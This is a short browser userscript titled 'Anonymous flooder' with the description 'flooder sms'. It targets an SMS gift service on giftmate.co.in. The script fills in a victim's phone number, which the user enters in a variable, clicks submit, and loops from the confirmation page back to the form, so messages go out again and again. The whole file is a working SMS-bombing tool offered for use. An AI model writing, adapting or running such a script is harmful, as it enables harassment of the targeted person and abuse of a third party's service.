// ==UserScript==
// @name          Anonymous flooder
// @namespace     Yash
// @description   flooder sms
// @include       http://*giftmate.co.in/*
// ==/UserScript==

var victim=0; //Enter victims number here

if(document.location=="http://wap.giftmate.co.in/mfUser_information.aspx")
{
document.getElementsByName("txtMobile")[0].value=victim;
document.getElementsByName("cmdSubmit")[0].click();
}
if(document.location=="http://wap.giftmate.co.in/Confirm.aspx")
document.location='http://wap.giftmate.co.in/mfUser_information.aspx';